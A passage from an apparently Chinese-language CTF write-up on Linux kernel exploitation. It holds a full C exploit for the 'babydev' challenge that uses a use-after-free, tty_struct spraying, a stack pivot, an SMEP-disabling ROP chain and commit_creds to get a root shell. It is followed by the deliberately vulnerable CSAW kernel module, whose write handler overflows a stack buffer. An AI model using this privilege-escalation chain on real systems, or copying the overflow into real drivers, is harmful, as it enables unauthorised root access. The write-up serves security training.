class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="number">3.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="number">4.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="number">5.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="number">6.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="number">7.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="number">8.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="number">9.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="number">10.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="number">11.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="number">12.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="number">13.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="number">14.</span></span><br><span class="line"><span class="number">15.</span><span class="meta">#<span class="meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span></span><br><span class="line"><span class="number">16.</span><span class="meta">#<span class="meta-keyword">define</span> SPRAY_ALLOC_TIMES 0x100</span></span><br><span class="line"><span class="number">17.</span></span><br><span class="line"><span class="number">18.</span><span class="keyword">int</span> spray_fd[<span class="number">0x100</span>];</span><br><span class="line"><span class="number">19.</span></span><br><span class="line"><span class="number">20.</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">21.</span></span><br><span class="line"><span class="comment">22.tty_struct:</span></span><br><span class="line"><span class="comment">23. int magic; // 4</span></span><br><span class="line"><span class="comment">24. struct kref kref; // 4</span></span><br><span class="line"><span class="comment">25. struct device *dev; // 8</span></span><br><span class="line"><span class="comment">26. struct tty_driver *driver; // 8</span></span><br><span class="line"><span class="comment">27. const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24</span></span><br><span class="line"><span class="comment">28. [...]</span></span><br><span class="line"><span class="comment">29.</span></span><br><span class="line"><span class="comment">30.*/</span></span><br><span class="line"><span class="number">31.</span></span><br><span class="line"><span class="number">32.</span><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line"><span class="number">33.</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">34. <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"><span class="number">35.</span> <span class="keyword">int</span> (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="number">36.</span> <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="number">37.</span> <span class="keyword">int</span> (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="number">38.</span> <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="number">39.</span> <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line"><span class="number">40.</span> <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line"><span class="number">41.</span> <span class="keyword">int</span> (*write)(struct tty_struct * tty,</span><br><span class="line"><span class="number">42.</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line"><span class="number">43.</span> <span class="keyword">int</span> (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line"><span class="number">44.</span> <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line"><span class="number">45.</span> <span class="keyword">int</span> (*write_room)(struct tty_struct *tty);</span><br><span class="line"><span class="number">46.</span> <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="number">47.</span> <span class="keyword">int</span> (*ioctl)(struct tty_struct *tty,</span><br><span class="line"><span class="number">48.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="number">49.</span> <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line"><span class="number">50.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="number">51.</span> <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line"><span class="number">52.</span> <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line"><span class="number">53.</span> <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line"><span class="number">54.</span> <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line"><span class="number">55.</span> <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line"><span class="number">56.</span> <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line"><span class="number">57.</span> <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line"><span class="number">58.</span> <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="number">59.</span> <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line"><span class="number">60.</span> <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line"><span class="number">61.</span> <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="number">62.</span> <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line"><span class="number">63.</span> <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line"><span class="number">64.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line"><span class="number">65.</span> <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line"><span class="number">66.</span> <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line"><span class="number">67.</span> <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line"><span class="number">68.</span> struct serial_icounter_struct *icount);</span><br><span class="line"><span class="number">69.</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line"><span class="number">70.</span>&#125;;</span><br><span class="line"><span class="number">71.</span></span><br><span class="line"><span class="number">72.</span><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>)))(*commit_creds_func)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="number">73.</span><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*prepare_kernel_cred_func)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="number">74.</span></span><br><span class="line"><span class="number">75.</span><span class="comment">/* Gadgets */</span></span><br><span class="line"><span class="number">76.</span>commit_creds_func commit_creds = (commit_creds_func) <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="number">77.</span>prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="number">78.u</span>nsigned <span class="keyword">long</span> native_write_cr4 = <span class="number">0xFFFFFFFF810635B0</span>;</span><br><span class="line"><span class="number">79.u</span>nsigned <span class="keyword">long</span> xchgeaxesp = <span class="number">0xFFFFFFFF81007808</span>;</span><br><span class="line"><span class="number">80.u</span>nsigned <span class="keyword">long</span> poprdiret = <span class="number">0xFFFFFFFF813E7D6F</span>;</span><br><span class="line"><span class="number">81.</span><span class="comment">//unsigned long iretq = 0xFFFFFFFF8181A797;</span></span><br><span class="line"><span class="number">82.u</span>nsigned <span class="keyword">long</span> iretq = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="number">83.u</span>nsigned <span class="keyword">long</span> swapgs = <span class="number">0xFFFFFFFF81063694</span>;</span><br><span class="line"><span class="number">84.</span></span><br><span class="line"><span class="number">85.</span><span class="comment">/* status */</span></span><br><span class="line"><span class="number">86.u</span>nsigned <span class="keyword">long</span> user_cs, user_ss, user_eflags;</span><br><span class="line"><span class="number">87.</span><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">88.</span> <span class="keyword">asm</span>(</span><br><span class="line"><span class="number">89.</span> <span class="string">"movq %%cs, %0n"</span></span><br><span class="line"><span class="number">90.</span> <span class="string">"movq %%ss, %1n"</span></span><br><span class="line"><span class="number">91.</span> <span class="string">"pushfqn"</span></span><br><span class="line"><span class="number">92.</span> <span class="string">"popq %2n"</span></span><br><span class="line"><span class="number">93.</span> :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags)</span><br><span class="line"><span class="number">94.</span> :</span><br><span class="line"><span class="number">95.</span> : <span class="string">"memory"</span></span><br><span class="line"><span class="number">96.</span> );</span><br><span class="line"><span class="number">97.</span>&#125;</span><br><span class="line"><span class="number">98.</span></span><br><span class="line"><span class="number">99.</span><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">100.</span> <span class="comment">// char *shell_str = "/bin/sh";</span></span><br><span class="line"><span class="number">101.</span> <span class="comment">// char *args[] = &#123;shell_str, NULL&#125;;</span></span><br><span class="line"><span class="number">102.</span> <span class="comment">// execve(shell_str, args, NULL);</span></span><br><span class="line"><span class="number">103.</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="number">104.</span>&#125;</span><br><span class="line"><span class="number">105.</span></span><br><span class="line"><span class="number">106.</span><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">107.</span> commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"><span class="number">108.</span>&#125;</span><br><span class="line"><span class="number">109.</span></span><br><span class="line"><span class="number">110.</span><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">111.</span> <span class="keyword">char</span> *buf = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="number">112.</span> <span class="keyword">char</span> *fake_file_operations = (<span class="keyword">char</span>*) <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>); <span class="comment">// big enough to be file_operations</span></span><br><span class="line"><span class="number">113.</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">fake_tty_operations</span> = (<span class="title">struct</span> <span class="title">tty_operations</span> *) <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">tty_operations</span>));</span></span><br><span class="line"><span class="number">114.</span> </span><br><span class="line"><span class="number">115.</span> save_stats();</span><br><span class="line"><span class="number">116.</span> </span><br><span class="line"><span class="number">117.</span> <span class="built_in">memset</span>(fake_tty_operations, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct tty_operations));</span><br><span class="line"><span class="number">118.</span> fake_tty_operations-&gt;proc_fops = &amp;fake_file_operations;</span><br><span class="line"><span class="number">119.</span> fake_tty_operations-&gt;ioctl = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)xchgeaxesp;</span><br><span class="line"><span class="number">120.</span> </span><br><span class="line"><span class="number">121.</span> <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"><span class="number">122.</span> <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"><span class="number">123.</span> <span class="keyword">int</span> fd;</span><br><span class="line"><span class="number">124.</span> <span class="comment">//ioctl(fd2, 0x10001, 0xa8); // the same'11 as cred struct size</span></span><br><span class="line"><span class="number">125.</span> ioctl(fd2, <span class="number">0x10001</span>, TTY_STRUCT_SIZE);</span><br><span class="line"><span class="number">126.</span> write(fd2, <span class="string">"hello world"</span>, <span class="built_in">strlen</span>(<span class="string">"hello world"</span>));</span><br><span class="line"><span class="number">127.</span> close(fd1);</span><br><span class="line"><span class="number">128.</span> fd = fd2;</span><br><span class="line"><span class="number">129.</span> </span><br><span class="line"><span class="number">130.</span> <span class="comment">// spray tty</span></span><br><span class="line"><span class="number">131.</span> <span class="built_in">puts</span>(<span class="string">"[+] Spraying buffer with tty_struct"</span>);</span><br><span class="line"><span class="number">132.</span> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line"><span class="number">133.</span> spray_fd[i] = open(<span class="string">"/dev/ptmx"</span>, O_RDWR | O_NOCTTY); </span><br><span class="line"><span class="number">134.</span> <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">135.</span> perror(<span class="string">"open tty"</span>);</span><br><span class="line"><span class="number">136.</span> &#125;</span><br><span class="line"><span class="number">137.</span> &#125;</span><br><span class="line"><span class="number">138.</span> </span><br><span class="line"><span class="number">139.</span> <span class="comment">// now we have a tty_struct in our buffer</span></span><br><span class="line"><span class="number">140.</span> <span class="built_in">puts</span>(<span class="string">"[+] Reading buffer content from kernel buffer"</span>);</span><br><span class="line"><span class="number">141.</span> <span class="keyword">long</span> size = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="number">142.</span>  <span class="keyword">if</span> (size &lt; <span class="number">32</span>) &#123;</span><br><span class="line"><span class="number">143.</span> <span class="built_in">puts</span>(<span class="string">"[-] Reading not complete!"</span>);</span><br><span class="line"><span class="number">144.</span> <span class="built_in">printf</span>(<span class="string">"[-] Only %ld bytes read.n"</span>, size);</span><br><span class="line"><span class="number">145.</span> &#125;</span><br><span class="line"><span class="number">146.</span> <span class="built_in">puts</span>(<span class="string">"[+] Detecting buffer content type"</span>);</span><br><span class="line"><span class="number">147.</span> <span class="keyword">if</span> (buf[<span class="number">0</span>] != <span class="number">0x01</span> || buf[<span class="number">1</span>] != <span class="number">0x54</span>) &#123;</span><br><span class="line"><span class="number">148.</span> <span class="built_in">puts</span>(<span class="string">"[-] tty_struct spray failed"</span>);</span><br><span class="line"><span class="number">149.</span> <span class="built_in">printf</span>(<span class="string">"[-] We should have 0x01 and 0x54, instead we got %02x %02xn"</span>, buf[<span class="number">0</span>], buf[<span class="number">1</span>]);</span><br><span class="line"><span class="number">150.</span> <span class="built_in">puts</span>(<span class="string">"[-] Exiting..."</span>);</span><br><span class="line"><span class="number">151.</span> <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"><span class="number">152.</span> &#125;</span><br><span class="line"><span class="number">153.</span> </span><br><span class="line"><span class="number">154.</span> <span class="built_in">puts</span>(<span class="string">"[+] Spray complete. Modifying function pointer"</span>);</span><br><span class="line"><span class="number">155.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">24</span>];</span><br><span class="line"><span class="number">156.</span> *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fake_tty_operations;</span><br><span class="line"><span class="number">157.</span> </span><br><span class="line"><span class="number">158.</span> <span class="built_in">puts</span>(<span class="string">"[+] Preparing ROP chain"</span>);</span><br><span class="line"><span class="number">159.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> lower_address = xchgeaxesp &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"><span class="number">160.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> base = lower_address &amp; ~<span class="number">0xfff</span>;</span><br><span class="line"><span class="number">161.</span> <span class="built_in">printf</span>(<span class="string">"[+] Base address is %lxn"</span>, base);</span><br><span class="line"><span class="number">162.</span> <span class="keyword">if</span> (mmap(base, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) != base) &#123;</span><br><span class="line"><span class="number">163.</span>  perror(<span class="string">"mmap"</span>);</span><br><span class="line"><span class="number">164.</span> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="number">165.</span> &#125;</span><br><span class="line"><span class="number">166.</span> </span><br><span class="line"><span class="number">167.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line"><span class="number">168.</span> poprdiret,</span><br><span class="line"><span class="number">169.</span> <span class="number">0x6f0</span>,</span><br><span class="line"><span class="number">170.</span> native_write_cr4,</span><br><span class="line"><span class="number">171.</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shellcode,</span><br><span class="line"><span class="number">172.</span> swapgs,</span><br><span class="line"><span class="number">173.</span> base,</span><br><span class="line"><span class="number">174.</span> iretq,</span><br><span class="line"><span class="number">175.</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell,</span><br><span class="line"><span class="number">176.</span> user_cs,</span><br><span class="line"><span class="number">177.</span> user_eflags,</span><br><span class="line"><span class="number">178.</span> base + <span class="number">0x10000</span>,</span><br><span class="line"><span class="number">179.</span> user_ss</span><br><span class="line"><span class="number">180.</span> &#125;;</span><br><span class="line"><span class="number">181.</span> <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)lower_address, rop_chain, <span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line"><span class="number">182.</span> </span><br><span class="line"><span class="number">183.</span> <span class="built_in">puts</span>(<span class="string">"[+] Writing function pointer to the driver"</span>);</span><br><span class="line"><span class="number">184.</span> <span class="keyword">long</span> len = write(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="number">185.</span> <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">186.</span> perror(<span class="string">"write"</span>);</span><br><span class="line"><span class="number">187.</span> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="number">188.</span> &#125;</span><br><span class="line"><span class="number">189.</span> </span><br><span class="line"><span class="number">190.</span> <span class="built_in">puts</span>(<span class="string">"[+] Triggering"</span>);</span><br><span class="line"><span class="number">191.</span> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line"><span class="number">192.</span> ioctl(spray_fd[i], <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//FFFFFFFF814D8AED call rax</span></span><br><span class="line"><span class="number">193.</span> &#125;</span><br><span class="line"><span class="number">194.</span> </span><br><span class="line"><span class="number">195.</span>&#125;</span><br><span class="line"><span class="number">196.</span></span><br><span class="line"><span class="number">197.</span><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">198.</span> exploit();</span><br><span class="line"><span class="number">199.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">200.</span>&#125;</span><br></pre></td></tr></table></figure>
<pre><code>其中，tty_struct和tty_operations都是从源码里找到的结构，不太需要解释，file_operations的存在主要是给他一个有效的指针，避免一些可能出现的错误，然后save_state函数用来保存用户空间的cs、eflags、ss的值，在iretq的时候，需要提供rip，cs,eflags,用户栈位置，ss值，所以我们要提前保存好备用。
通过打开/dev/ptmx设备，我们就新建了tty_struct。
通过计算tty_struct的大小，提前使用ioctl将buf的大小设置为一样的大小，之后新建tty_struct的时候,tty_struct就会落在这个buf里。
之后我们通过修改tty_struct的tty_operations，设置为我们自己的tty_operations即可，我们自己的tty_operations再修改ioctl为xchg esp, eax来使得rsp指向用户空间。
而这里的位置我们提前mmap，放入rop_chain的内容，这样xchg之后rsp就指向了rop_chain开始的位置，进入了rop流程啦，最后rop结束，执行完毕，打开了root shell，提权成功！
</code></pre><p>第二道</p>
<h1 id="0x01-漏洞代码"><a href="#0x01-漏洞代码" class="headerlink" title="0x01 :漏洞代码"></a>0x01 :漏洞代码</h1><p>有漏洞的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * csaw.c</span></span><br><span class="line"><span class="comment"> * CSAW CTF Challenge Kernel Module</span></span><br><span class="line"><span class="comment"> * Jon Oberheide &lt;jon@oberheide.org&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This module implements the /proc/csaw interface which can be read</span></span><br><span class="line"><span class="comment"> * and written like a normal file. For example:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ cat /proc/csaw </span></span><br><span class="line"><span class="comment"> * Welcome to the CSAW CTF challenge. Best of luck!</span></span><br><span class="line"><span class="comment"> * $ echo "Hello World" &gt; /proc/csaw</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LENGTH 64</span></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Jon Oberheide"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"CSAW CTF Challenge Kernel Module"</span>);</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">csaw_proc</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct proc_dir_entry &#123;</span></span><br><span class="line"><span class="comment">    unsigned short low_ino;</span></span><br><span class="line"><span class="comment">    unsigned short namelen;</span></span><br><span class="line"><span class="comment">    const char *name;</span></span><br><span class="line"><span class="comment">    mode_t mode;</span></span><br><span class="line"><span class="comment">    nlink_t nlink;</span></span><br><span class="line"><span class="comment">    uid_t uid;</span></span><br><span class="line"><span class="comment">    gid_t gid;</span></span><br><span class="line"><span class="comment">    unsigned long size;</span></span><br><span class="line"><span class="comment">    struct inode_operations * proc_iops;</span></span><br><span class="line"><span class="comment">    struct file_operations * proc_fops;</span></span><br><span class="line"><span class="comment">    get_info_t *get_info;</span></span><br><span class="line"><span class="comment">    struct module *owner;</span></span><br><span class="line"><span class="comment">    struct proc_dir_entry *next, *parent, *subdir;</span></span><br><span class="line"><span class="comment">    void *data;</span></span><br><span class="line"><span class="comment">    read_proc_t *read_proc;</span></span><br><span class="line"><span class="comment">    write_proc_t *write_proc;</span></span><br><span class="line"><span class="comment">    atomic_t count;      //use count </span></span><br><span class="line"><span class="comment">    int deleted;        //delete flag</span></span><br><span class="line"><span class="comment">    kdev_t    rdev;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_write(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, <span class="keyword">unsigned</span> <span class="keyword">long</span> count, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_writen"</span>);</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * We should be safe to perform this copy from userspace since our </span></span><br><span class="line"><span class="comment">     * kernel is compiled with CC_STACKPROTECTOR, which includes a canary</span></span><br><span class="line"><span class="comment">     * on the kernel stack to protect against smashing the stack.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * While the user could easily DoS the kernel, I don't think they</span></span><br><span class="line"><span class="comment">     * should be able to escalate privileges without discovering the </span></span><br><span class="line"><span class="comment">     * secret stack canary value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"csaw: error copying data from userspacen"</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_read(<span class="keyword">char</span> *page, <span class="keyword">char</span> **start, <span class="keyword">off_t</span> off, <span class="keyword">int</span> count, <span class="keyword">int</span> *eof, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_readn"</span>);</span><br><span class="line">    *eof = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"Welcome to the CSAW CTF challenge. Best 